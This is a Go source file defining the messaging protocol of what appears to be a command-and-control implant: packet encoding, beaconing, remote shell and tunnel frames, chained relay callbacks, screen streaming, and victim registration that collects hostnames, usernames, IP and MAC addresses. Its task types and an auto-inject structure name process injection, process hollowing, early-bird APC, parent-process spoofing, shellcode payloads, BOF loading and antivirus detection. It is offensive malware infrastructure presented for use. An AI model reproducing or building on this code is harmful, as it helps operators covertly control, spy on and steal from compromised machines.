package protocol

import "encoding/binary"

const (
	Magic        = "TSHL"
	Version      = 0x01
	HeaderSize   = 30
	MaxPayloadSize = 10 * 1024 * 1024
)

const (
	TypeRegister   = 0x00
	TypeHeartbeat = 0x01
	TypeTask       = 0x02
	TypeResult     = 0x03
	TypeFileUpload = 0x04
	TypeFileDown   = 0x05
	TypeAck        = 0x06
	TypeShellOpen  = 0x07
	TypeShellData  = 0x08
	TypeShellClose = 0x09
	TypeTunnel     = 0x0A
	TypeRelay      = 0x0B // 链式回连：中继节点转发的子会话帧
	TypeScreenFrame = 0x0C // 实时屏幕流：屏幕帧
	TypeRelayStatus = 0x0D // 中继节点监听状态上报（{addr}，空=已停止）
	TypeError      = 0xFF
)

// Frame-level type markers for wire transport (WebSocket/TCP).
// Each frame starts with 1 byte identifying its encoding.
const (
	FrameEncrypted = 0x00 // AES-GCM encrypted Packet (control msgs)
	FrameTunnelRaw = 0x01 // XOR-encoded tunnel stream (fast path)
)

const (
	TaskTypeCommand        = "command"
	TaskTypeFileList       = "file_list"
	TaskTypeFileDown       = "file_download"
	TaskTypeFileUp         = "file_upload"
	TaskTypeFileDel        = "file_delete"
	TaskTypeProcList       = "process_list"
	TaskTypeProcKill       = "process_kill"
	TaskTypeProcInject     = "process_inject"
	TaskTypeProcSpoof      = "process_spoof"
	TaskTypeAutoInject     = "auto_inject"
	TaskTypeSpawn          = "spawn"

	TaskTypeBOFLoad        = "bof_load"
	TaskTypeShell          = "shell"
	TaskTypeAVDetect       = "av_detect"
)

type Packet struct {
	Magic     [4]byte
	Version   byte
	Type      byte
	Length    uint32
	ID        uint64
	Timestamp uint64
	Checksum  uint32
	Payload   []byte
}

func EncodePacket(p *Packet) []byte {
	data := make([]byte, HeaderSize+len(p.Payload))
	copy(data[0:4], p.Magic[:])
	data[4] = p.Version
	data[5] = p.Type
	binary.BigEndian.PutUint32(data[6:10], p.Length)
	binary.BigEndian.PutUint64(data[10:18], p.ID)
	binary.BigEndian.PutUint64(data[18:26], p.Timestamp)
	binary.BigEndian.PutUint32(data[26:30], p.Checksum)
	copy(data[HeaderSize:], p.Payload)
	return data
}

func DecodeUint32(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func DecodeUint64(b []byte) uint64 {
	return binary.BigEndian.Uint64(b)
}

type Register struct {
	Hostname     string
	Username     string
	OS           string
	Arch         string
	PID          uint32
	ProcessName  string
	ProcessPath  string
	IPAddresses  []string
	MACAddresses []string
	Domain       string
}

type Task struct {
	ID          uint64   `json:"ID"`
	TaskType    string   `json:"TaskType"`
	Command     string   `json:"Command"`
	Args        []string `json:"Args"`
	Timeout     uint32   `json:"Timeout"`
	ExecuteType string   `json:"ExecuteType"`
	Path        string   `json:"Path,omitempty"`
	PID         uint32   `json:"PID,omitempty"`
	Data        string   `json:"Data,omitempty"`
}

type Result struct {
	TaskID   uint64 `json:"TaskID"`
	TaskType string `json:"TaskType"`
	ExitCode int32  `json:"ExitCode"`
	Output   string `json:"Output"`
	Error    string `json:"Error"`
	Data     []byte `json:"Data,omitempty"`
}

type Heartbeat struct {
	Status     string
	CPUUsage   float32
	MemoryUsed uint64
	Modules    []string
}

type FileInfo struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
	Mode    string `json:"mode"`
}

type ProcessInfo struct {
	PID     uint32 `json:"pid"`
	PPID    uint32 `json:"ppid"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	User    string `json:"user"`
	Memory  uint64 `json:"memory"`
	CPU     float64 `json:"cpu"`
}

type FileListResult struct {
	Path  string     `json:"path"`
	Files []FileInfo `json:"files"`
}

type ProcessListResult struct {
	Processes []ProcessInfo `json:"processes"`
}

type AutoInjectTask struct {
	TargetPID  uint32 `json:"target_pid"`
	Method     string `json:"method"`     // "remote_thread", "process_hollowing", "apc", "early_bird_apc"
	TargetPath string `json:"path,omitempty"`     // 服务器自动填入
	Payload    []byte `json:"payload,omitempty"`  // 服务器自动填入的shellcode
	AutoMode   bool   `json:"auto_mode"`          // 标识是否为自动模式
}
